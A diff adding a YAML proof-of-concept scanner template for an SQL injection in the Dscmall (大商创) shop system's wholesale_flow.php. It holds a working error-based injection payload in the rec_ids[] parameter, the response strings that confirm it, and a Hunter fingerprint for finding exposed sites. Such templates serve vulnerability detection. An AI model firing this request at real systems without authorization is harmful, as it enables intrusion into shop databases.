@@ -1,0 +1,18 @@
+id: poc-yaml-dscmall-wholesale-flow-php-sqli
+info:
+  name: 大商创多用户商城系统 wholesale_flow.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大商创多用户商城系统
+  hunter: app.name="Dscmall"
+requests:
+- method: POST
+  path: /wholesale_flow.php?step=ajax_update_cart
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: rec_ids[]=extractvalue(1,concat(0x7e,version()))
+  expression: status_code == 200 && contains(body,"MySQL server error report:Array")
+    && contains(body,"dsc_wholesale_cart") && contains(body,"XPATH syntax error")
+variables: {}
+transport: http
